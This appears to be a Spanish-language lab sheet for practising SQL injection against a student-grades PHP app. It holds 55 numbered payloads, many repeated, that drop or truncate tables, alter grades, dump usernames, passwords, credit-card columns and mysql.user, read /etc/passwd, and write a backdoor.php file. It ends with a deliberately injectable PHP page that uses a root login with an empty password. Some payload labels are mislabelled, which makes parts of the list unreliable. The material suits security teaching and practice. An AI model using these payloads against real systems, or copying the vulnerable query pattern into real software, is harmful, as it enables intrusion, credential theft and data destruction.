
1. **Manipulación directa del valor del parámetro `codigo_estudiante`**:
   - Entrada legítima: `2022001`
   - Inyección SQL: `2022001' OR '1'='1`

2. **Eliminar datos de la tabla `notas`**:
   - Inyección SQL: `' OR 1=1; DROP TABLE notas; --`

3. **Recuperar datos de otras tablas**:
   - Inyección SQL: `' UNION SELECT * FROM otra_tabla; --`

4. **Modificar los datos de las notas**:
   - Inyección SQL: `' OR 1=1; UPDATE notas SET corte1 = 5 WHERE 1=1; --`

5. **Recuperar credenciales de usuario o información confidencial**:
   - Inyección SQL: `' UNION SELECT username, password FROM users; --`

6. **Enumerar las tablas de la base de datos**:
   - Inyección SQL: `' UNION SELECT table_name, NULL FROM information_schema.tables; --`

7. **Enumerar las columnas de una tabla específica**:
   - Inyección SQL: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'notas'; --`

8. **Intentar acceder a archivos del sistema**:
   - Inyección SQL: `' UNION SELECT LOAD_FILE('/etc/passwd'), NULL; --`

9. **Forzar un retardo en la consulta** (ataque de tiempo basado en SQL):
   - Inyección SQL: `' OR SLEEP(10); --`

--------------

10. **Recuperar información confidencial a través de comentarios**:
    - Inyección SQL: `'; --`

11. **Utilizar funciones de base de datos para extraer datos específicos**:
    - Inyección SQL: `' UNION SELECT user(), database(), version(), NULL, NULL; --`

12. **Forzar una condición verdadera para obtener más datos**:
    - Inyección SQL: `' OR '1'='1'; --`

13. **Recuperar nombres de tablas y columnas a través de consultas de información del esquema**:
    - Inyección SQL: `UNION SELECT table_name, column_name FROM information_schema.columns; --`

14. **Intentar acceder a archivos del sistema para obtener información confidencial**:
    - Inyección SQL: `UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL, NULL, NULL; --`

15. **Modificar datos de la tabla `notas` para alterar las calificaciones**:
    - Inyección SQL: `'; UPDATE notas SET corte1 = 5 WHERE estudiante_codigo = '2022001'; --`

16. **Eliminar registros de la tabla `notas` para eliminar registros de calificaciones**:
    - Inyección SQL: `'; DELETE FROM notas WHERE estudiante_codigo = '2022001'; --`

17. **Intentar ejecutar comandos específicos del sistema operativo**:
    - Inyección SQL: `'; SELECT * FROM `users`; DROP TABLE `users`; --`

18. **Acceder a información privilegiada almacenada en la base de datos**:
    - Inyección SQL: `' UNION SELECT * FROM `informacion_privilegiada`; --`

-------------


19. **Recuperar nombres de tablas del esquema de la base de datos**:
    - Inyección SQL: `' UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = 'umanizales'; --`

20. **Recuperar usuarios de la base de datos y sus privilegios**:
    - Inyección SQL: `' UNION SELECT user, host, password, grant_priv, NULL FROM mysql.user; --`

21. **Obtener información sobre la estructura de la base de datos**:
    - Inyección SQL: `' UNION SELECT table_schema, table_name, column_name, NULL, NULL FROM information_schema.columns; --`

22. **Realizar un ataque de tipo time-based para inferir información sensible**:
    - Inyección SQL: `'; IF(SLEEP(5),1,0); --`

23. **Intentar enumerar los usuarios del sistema**:
    - Inyección SQL: `'; SELECT * FROM `sys`.`sys_users`; --`

24. **Realizar una inyección SQL ciega para extraer datos de forma indirecta**:
    - Inyección SQL: `' OR 1=1; --`

25. **Recuperar información confidencial almacenada en otras tablas**:
    - Inyección SQL: `' UNION SELECT credit_card_number, expiration_date, NULL, NULL, NULL FROM customer_data; --`

26. **Intentar ejecutar comandos del sistema operativo para obtener información sensible**:
    - Inyección SQL: `'; SELECT * FROM `sys`.`sys_processlist`; --`

-------------


27. **Recuperar información de otra tabla relacionada**:
    - Inyección SQL: `' UNION SELECT username, password, NULL, NULL, NULL FROM users; --`

28. **Eliminar datos de la tabla**:
    - Inyección SQL: `'; DROP TABLE notas; --`

29. **Actualizar datos en la tabla**:
    - Inyección SQL: `'; UPDATE notas SET corte1 = 5.0 WHERE estudiante_codigo = '2022001'; --`

30. **Insertar datos maliciosos en la tabla**:
    - Inyección SQL: `'; INSERT INTO notas (estudiante_codigo, asignatura, corte1, corte2, corte3) VALUES ('2022001', 'SQL Injection', 5.0, 5.0, 5.0); --`

31. **Recuperar información del sistema operativo**:
    - Inyección SQL: `'; SELECT LOAD_FILE('/etc/passwd'); --` (Nota: esto es específico de MySQL y depende de la configuración del servidor)

32. **Obtener el hash de la contraseña del usuario**:
    - Inyección SQL: `' UNION SELECT 'admin', password_hash, NULL, NULL, NULL FROM usuarios WHERE username = 'admin'; --`

33. **Ejecutar comandos arbitrarios del sistema operativo**:
    - Inyección SQL: `'; SELECT * FROM `sys`.`sys_config` INTO OUTFILE '/var/www/html/backdoor.php'; --`

34. **Recuperar información del archivo de configuración de la base de datos**:
    - Inyección SQL: `'; SELECT LOAD_FILE('/etc/mysql/my.cnf'); --` (Nota: depende de la configuración del servidor)

35. **Intentar realizar una inyección SQL basada en error**:
    - Inyección SQL: `'; SELECT * FROM non_existent_table; --`

---------------


36. **Recuperar contraseñas almacenadas en texto plano**:
    - Inyección SQL: `'; SELECT username, plaintext_password FROM users; --`

37. **Intentar acceder a datos confidenciales en la base de datos**:
    - Inyección SQL: `'; SELECT * FROM credit_card_data; --`

38. **Obtener información sensible sobre la estructura de la base de datos**:
    - Inyección SQL: `'; SELECT table_name FROM information_schema.tables; --`

39. **Recuperar información de tablas del sistema**:
    - Inyección SQL: `'; SELECT * FROM sys.sysobjects WHERE xtype = 'U'; --`

40. **Eliminar registros específicos de la tabla**:
    - Inyección SQL: `'; DELETE FROM notas WHERE estudiante_codigo = '2022001'; --`

41. **Recuperar contraseñas almacenadas en formato hash débil**:
    - Inyección SQL: `'; SELECT username, weak_hashed_password FROM users; --`

42. **Realizar una denegación de servicio (DoS) truncando la tabla**:
    - Inyección SQL: `'; TRUNCATE TABLE notas; --`

43. **Intentar acceder a directorios sensibles del servidor**:
    - Inyección SQL: `'; SELECT LOAD_FILE('/etc/passwd'); --`

44. **Recuperar información confidencial de los usuarios**:
    - Inyección SQL: `'; SELECT username, email, phone_number FROM users; --`

45. **Modificar registros de usuarios privilegiados**:
    - Inyección SQL: `'; UPDATE users SET role='admin' WHERE username='admin'; --`

-------------

46. **Intentar acceder a archivos del sistema para obtener información confidencial**:
    - Inyección SQL: `'; SELECT LOAD_FILE('/etc/passwd'); --`

47. **Recuperar información de otras tablas relacionadas**:
    - Inyección SQL: `'; UNION SELECT username, password, NULL, NULL, NULL FROM users; --`

48. **Eliminar datos de la tabla notas**:
    - Inyección SQL: `'; DROP TABLE notas; --`

49. **Actualizar datos en la tabla notas**:
    - Inyección SQL: `'; UPDATE notas SET corte1 = 5.0 WHERE estudiante_codigo = '2022001'; --`

50. **Insertar datos maliciosos en la tabla notas**:
    - Inyección SQL: `'; INSERT INTO notas (estudiante_codigo, asignatura, corte1, corte2, corte3) VALUES ('2022001', 'SQL Injection', 5.0, 5.0, 5.0); --`

51. **Recuperar información del sistema operativo**:
    - Inyección SQL: `'; SELECT LOAD_FILE('/etc/passwd'); --` (Nota: esto es específico de MySQL y depende de la configuración del servidor)

52. **Obtener el hash de la contraseña del usuario**:
    - Inyección SQL: `'; UNION SELECT 'admin', password_hash, NULL, NULL, NULL FROM usuarios WHERE username = 'admin'; --`

53. **Ejecutar comandos arbitrarios del sistema operativo**:
    - Inyección SQL: `'; SELECT * FROM sys.sys_config INTO OUTFILE '/var/www/html/backdoor.php'; --`

54. **Recuperar información del archivo de configuración de la base de datos**:
    - Inyección SQL: `'; SELECT LOAD_FILE('/etc/mysql/my.cnf'); --` (Nota: depende de la configuración del servidor)

55. **Intentar realizar una inyección SQL basada en error**:
    - Inyección SQL: `'; SELECT * FROM non_existent_table; --`


Codigo vulnerable para practicas
```
<?php
    // Iniciar sesión
    session_start();

    // Redirigir al usuario a la página de inicio de sesión si no está autenticado
    if (!isset($_SESSION['usuario'])) {
        header("Location: acceso.php");
        exit;
    }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Historial de Notas</title>
</head>
<body>
    <h1>Historial de Notas</h1>
    <form action="calificaciones.php" method="GET">
        Código de Estudiante:
        <input type="text" name="codigo_estudiante">
        <input type="submit" value="Buscar">
    </form>
    <?php
        $dbuser = 'root';
        $dbpassword = "";

        // Establecer conexión a la base de datos
        $conn = new PDO("mysql:host=127.0.0.1:3306;dbname=umanizales", $dbuser, $dbpassword);

        if(isset($_GET["codigo_estudiante"])){
            $codigo_estudiante = $_GET["codigo_estudiante"];

            // Preparar y ejecutar la consulta
            // Modificación para hacer vulnerable a las inyecciones SQL
            $consultaSQL = $conn->prepare("SELECT * FROM notas WHERE estudiante_codigo = '$codigo_estudiante'");
            $consultaSQL->execute();
    ?>
    <h2>Historial de Notas</h2>
    <table border="1">
        <tr>
            <th>Asignatura</th>
            <th>Corte 1</th>
            <th>Corte 2</th>
            <th>Corte 3</th>
        </tr>
        <?php
        // Mostrar los resultados de la consulta en forma de tabla
        while ($row = $consultaSQL->fetch(PDO::FETCH_ASSOC)){
        ?>
        <tr>
            <td><?php echo $row["asignatura"]; ?></td>
            <td><?php echo $row["corte1"]; ?></td>
            <td><?php echo $row["corte2"]; ?></td>
            <td><?php echo $row["corte3"]; ?></td>
        </tr>
        <?php
        }
        ?>
    </table>
    <?php
    }
    ?>
       <!-- Botón para regresar a main.php -->
    <form action="main.php">
        <input type="submit" value="Volver a Main">
    </form>
</body>
</html>


```
